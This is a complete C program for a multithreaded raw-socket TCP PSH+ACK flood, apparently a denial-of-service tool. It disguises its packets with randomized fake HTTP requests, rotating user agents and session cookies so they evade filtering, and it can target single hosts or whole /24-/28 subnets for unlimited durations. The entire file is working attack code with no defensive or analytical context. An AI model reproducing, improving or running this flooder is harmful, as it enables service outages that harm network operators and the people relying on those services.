#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdatomic.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <sched.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/uio.h>

#define BATCH_MAX 1024
#define MAX_PKT  1500

static volatile int running = 1;

typedef struct {
	_Atomic unsigned long long sent;
	_Atomic unsigned long long bytes;
	_Atomic unsigned long long errors;
	unsigned int pps_cur;
	unsigned long long bps_cur;
} stats_t;
static stats_t g_stats;

static __thread unsigned int rx;
static void sd_rng(unsigned int s) { rx = s * 2654435761U + 1; }
static inline unsigned int gt_rng(void) {
	rx ^= rx << 13; rx ^= rx >> 17; rx ^= rx << 5;
	return rx;
}

static unsigned int rslv(const char *h) {
	struct addrinfo *ai;
	if (getaddrinfo(h, NULL, NULL, &ai)) return 0;
	unsigned int r = ((struct sockaddr_in *)ai->ai_addr)->sin_addr.s_addr;
	freeaddrinfo(ai);
	return r;
}

static unsigned int get_src(unsigned int dst) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) return 0;
	struct sockaddr_in sin = { .sin_family = AF_INET, .sin_addr.s_addr = dst, .sin_port = htons(80) };
	if (connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0) { close(fd); return 0; }
	struct sockaddr_in local;
	socklen_t l = sizeof(local);
	getsockname(fd, (struct sockaddr *)&local, &l);
	close(fd);
	return local.sin_addr.s_addr;
}

static void fmt_bw(char *buf, size_t n, unsigned long long bps) {
	if (bps >= 1000000000ULL)
		snprintf(buf, n, "%.2f Gbps", (double)bps / 1e9);
	else if (bps >= 1000000ULL)
		snprintf(buf, n, "%.2f Mbps", (double)bps / 1e6);
	else
		snprintf(buf, n, "%.2f Kbps", (double)bps / 1e3);
}

static const char *uas[] = {
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2) AppleWebKit/605.1.15 Safari/605.1.15",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
	"curl/8.4.0","Wget/1.21.4","Python/3.11 aiohttp/3.9.1"
};
#define NUAS 8

static const char *paths[] = {
	"/","/index.html","/search?q=test","/api/v2/users","/login",
	"/static/js/bundle.js","/assets/css/main.css","/favicon.ico",
	"/manifest.json","/service-worker.js","/api/status","/healthz",
	"/v1/data?limit=50","/stream?type=json","/oauth/token"
};
#define NPATHS 15

#define NPA 64
static char pa[NPA][1024];
static int pl[NPA];

static void bld_pa(void) {
	static const char *langs[] = {
		"en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9,en;q=0.6","de-DE,de;q=0.9,en;q=0.5"
	};
	static const char *meths[] = { "GET", "HEAD", "OPTIONS", "GET", "POST", "GET" };
	for (int i = 0; i < NPA; i++) {
		unsigned int h = (unsigned int)((unsigned long)&i * 2654435761U) + (unsigned int)i * 31337U;
		h ^= h >> 16;
		int mi = h % 6; h >>= 3;
		const char *method = meths[mi];
		int pi = h % NPATHS; h >>= 4;
		int ui = h % NUAS; h >>= 3;
		int li = h % 4; h >>= 2;
		unsigned int ck = h + (unsigned int)i * 524287U;
		char ref[64] = "";
		if (h & 1) snprintf(ref, sizeof(ref), "Referer: http://t/%s\r\n", paths[(h >> 1) % NPATHS]);
		char cookie[48];
		snprintf(cookie, sizeof(cookie), "Cookie: session=%08x%08x\r\n", ck, ~ck);
		char dnt[16] = "";
		if (h & 1) snprintf(dnt, sizeof(dnt), "DNT: 1\r\n");
		int r;
		if (mi == 4) {
			r = snprintf(pa[i], sizeof(pa[i]),
				"POST %s HTTP/1.1\r\n"
				"Host: t\r\n"
				"User-Agent: %s\r\n"
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
				"Accept-Language: %s\r\n"
				"Accept-Encoding: gzip, deflate, br\r\n"
				"Connection: keep-alive\r\n"
				"%s%s%s"
				"Upgrade-Insecure-Requests: 1\r\n"
				"Sec-Fetch-Dest: document\r\n"
				"Sec-Fetch-Mode: navigate\r\n"
				"Sec-Fetch-Site: none\r\n"
				"Sec-Fetch-User: ?1\r\n"
				"Cache-Control: no-cache\r\n"
				"Content-Type: application/x-www-form-urlencoded\r\n"
				"Content-Length: 11\r\n"
				"\r\n"
				"key=value&a=1",
				paths[pi], uas[ui], langs[li],
				cookie, ref, dnt);
		} else {
			r = snprintf(pa[i], sizeof(pa[i]),
				"%s %s HTTP/1.1\r\n"
				"Host: t\r\n"
				"User-Agent: %s\r\n"
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
				"Accept-Language: %s\r\n"
				"Accept-Encoding: gzip, deflate, br\r\n"
				"Connection: keep-alive\r\n"
				"%s%s%s"
				"Upgrade-Insecure-Requests: 1\r\n"
				"Sec-Fetch-Dest: document\r\n"
				"Sec-Fetch-Mode: navigate\r\n"
				"Sec-Fetch-Site: none\r\n"
				"Sec-Fetch-User: ?1\r\n"
				"Cache-Control: no-cache\r\n\r\n",
				method, paths[pi], uas[ui], langs[li],
				cookie, ref, dnt);
		}
		if (r < 0) r = 1;
		if (r >= (int)sizeof(pa[i])) r = (int)sizeof(pa[i]) - 1;
		pl[i] = r;
	}
}

static int bld_tpl(char *buf, int pkt_sz, const char *pload, int plen, int pay_len,
	unsigned long *out_csum)
{
	int ol = 12, tl = 20 + ol, doff = (tl + 3) / 4;
	if (doff > 15) doff = 15;
	int data_len = plen + pay_len, tcp_len = tl + data_len;
	int pkt_len = 20 + tcp_len;
	if (pkt_len > pkt_sz) pkt_len = pkt_sz;

	memset(buf, 0, (size_t)pkt_len);

	struct iphdr *ip = (struct iphdr *)buf;
	ip->version  = 4;
	ip->ihl      = 5;
	ip->tot_len  = htons((unsigned short)pkt_len);
	ip->frag_off = htons(0x4000);
	ip->ttl      = 64;
	ip->protocol = IPPROTO_TCP;

	unsigned char *tcp = (unsigned char *)(buf + 20);
	tcp[12] = (unsigned char)(doff << 4);
	tcp[13] = 0x18;
	tcp[20] = 1; tcp[21] = 1;
	tcp[22] = 8; tcp[23] = 10;

	int off = 20 + tl;
	int cp = plen;
	if (cp > pkt_len - off) cp = pkt_len - off;
	memcpy(buf + off, pload, (size_t)cp);
	if (pay_len > 0 && off + cp + pay_len <= pkt_len) {
		unsigned char *pp = (unsigned char *)(buf + off + cp);
		for (int j = 0; j < pay_len; j++)
			pp[j] = (unsigned char)((unsigned int)j * 31337U);
	}

	unsigned long cs = 0;
	unsigned short *wp = (unsigned short *)tcp;
	int nw = tcp_len / 2;
	for (int i = 0; i < nw; i++) cs += wp[i];
	if (tcp_len & 1) cs += tcp[tcp_len - 1];
	*out_csum = cs;
	return pkt_len;
}

static void patch_pkt(char *buf, int pkt_len,
	unsigned int src, unsigned int dst,
	unsigned int seq, unsigned int ack,
	unsigned short sport, unsigned short dport,
	unsigned short win, unsigned short ipid,
	unsigned int ts_val, unsigned int ts_ecr,
	unsigned long tpl_csum)
{
	struct iphdr *ip = (struct iphdr *)buf;
	ip->id       = htons(ipid);
	ip->saddr    = src;
	ip->daddr    = dst;
	ip->check    = 0;

	unsigned long ics = 0;
	unsigned short *ipw = (unsigned short *)ip;
	ics += ipw[0] + ipw[1] + ipw[2] + ipw[3] + ipw[4];
	ics += ipw[5] + ipw[6] + ipw[7] + ipw[8] + ipw[9];
	ics = (ics >> 16) + (ics & 0xFFFF);
	ics += (ics >> 16);
	ip->check = ~(unsigned short)ics;

	unsigned char *tcp = (unsigned char *)(buf + 20);
	unsigned short *tcp16 = (unsigned short *)tcp;

	tcp16[0] = sport;
	tcp16[1] = dport;
	*(unsigned int *)(tcp + 4) = seq;
	*(unsigned int *)(tcp + 8) = ack;
	tcp16[7] = win;
	memcpy(tcp + 24, &ts_val, 4);
	memcpy(tcp + 28, &ts_ecr, 4);

	int tcp_len = pkt_len - 20;
	unsigned long ch = tpl_csum;

	ch += sport + dport;
	ch += (seq >> 16) + (seq & 0xFFFF);
	ch += (ack >> 16) + (ack & 0xFFFF);
	ch += win;
	ch += (ts_val >> 16) + (ts_val & 0xFFFF);
	ch += (ts_ecr >> 16) + (ts_ecr & 0xFFFF);
	ch += (src >> 16) + (src & 0xFFFF);
	ch += (dst >> 16) + (dst & 0xFFFF);
	ch += htons(IPPROTO_TCP) + htons((unsigned short)tcp_len);

	ch = (ch >> 16) + (ch & 0xFFFF);
	ch += (ch >> 16);
	tcp16[8] = (unsigned short)(~ch & 0xFFFF);
}

struct wcfg {
	unsigned int src_ip, dst_base;
	int num_hosts, dst_port, duration, pay_len, pkt_sz, tid, npa;
	int *tpl_len; char (*tpl)[MAX_PKT];
	unsigned long *tpl_csum;
};

static void *worker(void *arg) {
	struct wcfg *cfg = (struct wcfg *)arg;

	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(cfg->tid, &cpuset);
	pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);

	sd_rng((unsigned int)(unsigned long)pthread_self() ^ (unsigned int)time(NULL));

	size_t pool = (size_t)MAX_PKT * BATCH_MAX
		+ sizeof(struct sockaddr_in) * BATCH_MAX
		+ sizeof(struct iovec) * BATCH_MAX
		+ sizeof(struct mmsghdr) * BATCH_MAX;
	char *mem = malloc(pool);
	if (!mem) return NULL;

	char *pkt_buf = mem;
	struct sockaddr_in *addrs = (struct sockaddr_in *)(pkt_buf + (size_t)MAX_PKT * BATCH_MAX);
	struct iovec *iov = (struct iovec *)(addrs + BATCH_MAX);
	struct mmsghdr *msgs = (struct mmsghdr *)(iov + BATCH_MAX);

	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0) { free(mem); return NULL; }
	int one = 1;
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
	int sndbuf = 32 * 1024 * 1024;
	setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

	for (unsigned int n = 0; n < BATCH_MAX; n++) {
		addrs[n].sin_family = AF_INET;
		addrs[n].sin_port   = htons(cfg->dst_port);
		msgs[n].msg_hdr.msg_name   = &addrs[n];
		msgs[n].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
		msgs[n].msg_hdr.msg_iov     = &iov[n];
		msgs[n].msg_hdr.msg_iovlen  = 1;
	}

	long long deadline = cfg->duration > 0
		? (long long)time(NULL) + cfg->duration
		: 0x7FFFFFFFFFFFFFFFLL;

	while (running && time(NULL) < deadline) {
		unsigned int r0 = gt_rng(), r1 = gt_rng(), r2 = gt_rng();

		for (unsigned int n = 0; n < BATCH_MAX; n++) {
			unsigned int dst = cfg->dst_base
				+ ((r0 + n * 1013U) % (unsigned int)cfg->num_hosts);
			unsigned short sport = (unsigned short)(32768 + ((r1 + n * 7919U) % 28232));
			unsigned int seq = htonl(r0 + n * 65521U);
			unsigned int ack = htonl(r1 + n * 524287U);
			unsigned short win = htons((unsigned short)(4096 + ((r0 + n * 12347U) % 61440)));
			unsigned short ipid = (unsigned short)(r0 + n * 52429U + (r2 >> 16));
			unsigned int ts_val = htonl(r1 + n * 1000 + (r2 & 0xFFF));
			unsigned int ts_ecr = htonl((r1 > 50000 ? r1 - 50000 : 0) + n * 7);
			int pi = (int)((r2 + n * 1543U) % (unsigned int)cfg->npa);

			char *pkt = pkt_buf + n * MAX_PKT;
			int pkt_len = cfg->tpl_len[pi];
			memcpy(pkt, cfg->tpl[pi], (size_t)pkt_len);

			patch_pkt(pkt, pkt_len,
				cfg->src_ip, dst, seq, ack,
				htons(sport), htons((unsigned short)cfg->dst_port),
				win, ipid, ts_val, ts_ecr,
				cfg->tpl_csum[pi]);

			addrs[n].sin_addr.s_addr = dst;
			iov[n].iov_base = pkt;
			iov[n].iov_len  = (size_t)pkt_len;
		}

		int ret = sendmmsg(sock, msgs, BATCH_MAX, 0);
		if (ret > 0) {
			unsigned long tb = 0;
			for (unsigned int n = 0; n < (unsigned int)ret; n++)
				tb += (unsigned long)iov[n].iov_len;
			atomic_fetch_add_explicit(&g_stats.sent, ret, memory_order_relaxed);
			atomic_fetch_add_explicit(&g_stats.bytes, tb, memory_order_relaxed);
		} else if (ret < 0) {
			atomic_fetch_add_explicit(&g_stats.errors, 1, memory_order_relaxed);
		}
	}

	free(mem);
	close(sock);
	return NULL;
}

static void *stats_loop(void *arg) {
	(void)arg;
	unsigned long long last_pkt = 0, last_byte = 0;
	while (running) {
		sleep(2);
		unsigned long long cur_pkt = atomic_load_explicit(&g_stats.sent, memory_order_relaxed);
		unsigned long long cur_byte = atomic_load_explicit(&g_stats.bytes, memory_order_relaxed);
		g_stats.pps_cur = (unsigned int)((cur_pkt - last_pkt) / 2);
		g_stats.bps_cur = (cur_byte - last_byte) * 8 / 2;
		last_pkt = cur_pkt;
		last_byte = cur_byte;
		char bw[16];
		fmt_bw(bw, sizeof(bw), g_stats.bps_cur);
		unsigned long long errs = atomic_load_explicit(&g_stats.errors, memory_order_relaxed);
		printf("\r  %u pps  %s  |  %llu err  ",
		       g_stats.pps_cur, bw, errs);
		fflush(stdout);
	}
	printf("\n");
	return NULL;
}

static void handle_sig(int s) { (void)s; running = 0; }

static void usage(const char *n) {
	fprintf(stderr,
		"Usage: %s <target> <port> <time> [-t threads] [-l len]\n"
		"\n"
		"SOCK_RAW PSH+ACK flood, delta checksum engine.\n"
		"Per-thread config, CPU pinned, ~23 adds/pkt checksum.\n"
		"\n"
		"  target   IP or CIDR /24-/28\n"
		"  port     TCP port\n"
		"  time     duration (0 = infinite)\n"
		"  -t N     threads (default 4)\n"
		"  -l N     extra payload bytes 0-1400 (default 0)\n"
		, n);
}

int main(int argc, char **argv) {
	int threads = 4, pay_len = 0, opt;

	while ((opt = getopt(argc, argv, "t:l:h")) != -1) {
		switch (opt) {
		case 't': threads = atoi(optarg); break;
		case 'l': pay_len = atoi(optarg); break;
		case 'h': default: usage(argv[0]); return opt == 'h' ? 0 : 1;
		}
	}
	if (optind + 3 > argc) { usage(argv[0]); return 1; }
	const char *target = argv[optind];
	int port = atoi(argv[optind + 1]);
	int duration = atoi(argv[optind + 2]);
	if (port < 1 || port > 65535) { fprintf(stderr, "bad port\n"); return 1; }
	if (pay_len < 0) pay_len = 0;
	if (pay_len > 1400) pay_len = 1400;
	if (geteuid() != 0) { fprintf(stderr, "root required\n"); return 1; }

	bld_pa();

	unsigned int dst_base, dst_ip;
	int prefix, num_hosts;
	char subnet_buf[64] = "";
	char *slash = strchr(target, '/');

	if (slash) {
		char ip[32];
		int ln = (int)(slash - target);
		if (ln == 0 || ln >= (int)sizeof(ip)) { fprintf(stderr, "bad cidr\n"); return 1; }
		memcpy(ip, target, (size_t)ln); ip[ln] = 0;
		if (inet_pton(AF_INET, ip, &dst_base) != 1) { fprintf(stderr, "bad ip\n"); return 1; }
		prefix = atoi(slash + 1);
		if (prefix < 24 || prefix > 28) { fprintf(stderr, "use /24-/28\n"); return 1; }
		num_hosts = 1 << (32 - prefix);
		unsigned int h = ntohl(dst_base);
		if (prefix >= 28) h &= 0xFFFFFFF0;
		else if (prefix >= 27) h &= 0xFFFFFFE0;
		else if (prefix >= 26) h &= 0xFFFFFFC0;
		else if (prefix >= 25) h &= 0xFFFFFF80;
		else h &= 0xFFFFFF00;
		dst_base = htonl(h);
		dst_ip = dst_base;
		snprintf(subnet_buf, sizeof(subnet_buf), "%d IPs (/%d)", num_hosts, prefix);
	} else {
		dst_ip = rslv(target);
		if (!dst_ip) { fprintf(stderr, "cannot resolve %s\n", target); return 1; }
		dst_base = dst_ip;
		num_hosts = 1;
	}

	unsigned int src_ip = get_src(dst_ip);
	if (!src_ip) { fprintf(stderr, "cannot determine source IP\n"); return 1; }

	struct in_addr sa = { .s_addr = src_ip }, da = { .s_addr = dst_ip };

	signal(SIGINT, handle_sig);
	signal(SIGTERM, handle_sig);

	int max_pl = pl[0];
	for (int i = 1; i < NPA; i++) if (pl[i] > max_pl) max_pl = pl[i];
	int pkt_sz = 20 + 32 + max_pl + pay_len;
	if (pkt_sz > MAX_PKT) pkt_sz = MAX_PKT;
	if (pkt_sz < 64) pkt_sz = 64;

	static char tpls[NPA][MAX_PKT];
	static int tpl_lens[NPA];
	static unsigned long tpl_csums[NPA];
	for (int i = 0; i < NPA; i++)
		tpl_lens[i] = bld_tpl(tpls[i], pkt_sz, pa[i], pl[i], pay_len, &tpl_csums[i]);

	printf(
		"  Target:   %s:%d\n"
		"  Subnet:   %s\n"
		"  Source:   %s\n"
		"  Threads:  %d\n"
		"  Duration: %ds\n"
		"  Payload:  %d B extra  (pkt ~%d B)\n"
		"  Batch:    %d  |  Csum: ~23 adds/pkt (delta)\n"
		"  Buffer:   32MB sndbuf  |  I/O: sendmmsg\n"
		"  Type:     SOCK_RAW, pre-built templates, CPU pinned\n"
		"  Press Ctrl+C to stop\n\n",
		inet_ntoa(da), port, subnet_buf[0] ? subnet_buf : "single host",
		inet_ntoa(sa), threads,
		duration > 0 ? duration : 0, pay_len, pkt_sz,
		BATCH_MAX);

	struct wcfg *cfgs = malloc(sizeof(struct wcfg) * (size_t)threads);
	int nproc = (int)sysconf(_SC_NPROCESSORS_ONLN);
	for (int i = 0; i < threads; i++) {
		cfgs[i] = (struct wcfg){
			src_ip, dst_base, num_hosts, port, duration,
			pay_len, pkt_sz, i % nproc, NPA,
			tpl_lens, tpls, tpl_csums
		};
	}

	pthread_t st;
	pthread_create(&st, NULL, stats_loop, NULL);

	pthread_t *tids = malloc(sizeof(pthread_t) * (size_t)threads);
	for (int i = 0; i < threads; i++)
		pthread_create(&tids[i], NULL, worker, &cfgs[i]);
	for (int i = 0; i < threads; i++)
		pthread_join(tids[i], NULL);

	running = 0;
	pthread_join(st, NULL);
	free(tids);
	free(cfgs);

	printf("\n  Final: %llu pkts, %llu bytes, %llu errors\n",
	       atomic_load_explicit(&g_stats.sent, memory_order_relaxed),
	       atomic_load_explicit(&g_stats.bytes, memory_order_relaxed),
	       atomic_load_explicit(&g_stats.errors, memory_order_relaxed));
	return 0;
}
